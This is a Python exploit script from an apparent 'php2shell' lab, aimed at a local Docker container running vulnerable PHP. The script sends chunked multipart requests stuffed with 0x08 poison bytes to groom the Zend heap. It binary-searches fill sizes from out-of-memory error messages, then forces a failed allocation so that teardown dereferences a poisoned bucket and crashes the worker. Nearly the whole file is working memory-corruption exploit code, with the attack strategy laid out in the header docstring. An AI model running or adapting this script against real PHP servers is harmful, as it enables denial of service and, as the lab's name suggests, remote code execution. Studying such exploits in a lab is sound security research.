#!/usr/bin/env python3
"""php2shell lab, oom8: flat-name geometry -> key-run crossing.

Why oom7 survived: max_input_vars counts NESTED vars (a[u_i] = 2). 475 units
burned 950 vars; key run got 28 vars = 10KB growth < 135168B window (the
failed-alloc size) -> survive.

oom8: flat top-level names. 1 var per unit.
  - b0 churn: 2x 256KB poison + free -> poison block on Zend MM large list
  - first inserts convert root table packed->hash -> arData carved from poison
  - fill: 475 flat units x 128KB poison (475 vars) + rem (1 var)
  - keys: 523 vars x (328B key + 316B param, freed) -> 188KB growth > window
  - only allocs after rem are keys -> crossing alloc IS a key (alloc=328)
  - malformed bucket slot = poison bytes -> teardown IS_OBJECT deref 0x0808...
"""

import re
import socket
import subprocess
import sys
import time

HOST = "127.0.0.1"
BOUNDARY = "b" + "X" * 20
POISON = b"\x08"
UNIT = 128 * 1024
LONGKEY = 300
KEYRUN = 3000
BIGFREE = 256 * 1024


def part(name: str, value: bytes) -> bytes:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
    ).encode()
    return head + value + b"\r\n"


def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True, timeout=60)
    time.sleep(1.5)


def send(port: int, parts: list[bytes], path: str = "index.php") -> tuple[bool, str]:
    body = b"".join(parts) + b"--" + BOUNDARY.encode() + b"--\r\n"
    s = socket.create_connection((HOST, port), timeout=300)
    s.sendall(
        (
            f"POST /{path} HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    for i in range(0, len(body), 65536):
        c = body[i:i + 65536]
        s.sendall(f"{len(c):x}\r\n".encode() + c + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    return ("Fatal error" in resp.decode("utf-8", "replace")), resp.decode("utf-8", "replace")


def fatal_n(text: str):
    m = re.search(r"tried to allocate (\d+) bytes", text)
    return int(m.group(1)) if m else None


def build(fill_units: int, rem: int, keyrun: int = 0, dbg: bool = False) -> list[bytes]:
    big = POISON * BIGFREE
    ps = [part("b0", big), part("b0", big)]              # poison + free (2 vars)
    fill = POISON * UNIT
    for i in range(fill_units):                           # flat: 1 var each
        ps.append(part(f"u{i}", fill))
    if rem > 0:
        ps.append(part("r", POISON * rem))
    keyname = (POISON * LONGKEY).decode("latin1")
    for k in range(keyrun):
        ps.append(part(keyname + str(k), b"x"))
    return ps


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)

    # calibrate units (churn included)
    a, b = 300, 520
    u_ok = None
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(mid, 0))
        log(f"cal units={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            u_ok = mid
            a = mid + 1
    if u_ok is None:
        log("300 units fatal; abort")
        return
    # calibrate rem
    a, b = 0, UNIT
    r_ok = 0
    while a <= b:
        mid = (a + b) // 2
        restart()
        fatal, _ = send(port, build(u_ok, mid))
        log(f"cal rem={mid}: fatal={fatal}")
        if fatal:
            b = mid - 1
        else:
            r_ok = mid
            a = mid + 1
    log(f"edge: {u_ok} units + rem {r_ok}")

    # strikes: full key pool, G sweep INCLUDING zero and negative-margin fills
    for extra in (UNIT, UNIT // 2, 16384, 4096, 0):      # drop fill below edge
        rem = r_ok - extra
        restart()
        fatal, text = send(port, build(u_ok - (1 if extra else 0), rem, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        tag = ""
        if fatal and n is not None and n < LONGKEY + 128:
            tag = "  *** KEY/HASH-PATH CROSSING ***"
        log(f"strike extra={extra} fatal={fatal} alloc={n}{tag}")
        if tag:
            log(text[:400])
            break
    log("done — check error.log for 'exit signal Segmentation'")


if __name__ == "__main__":
    main()
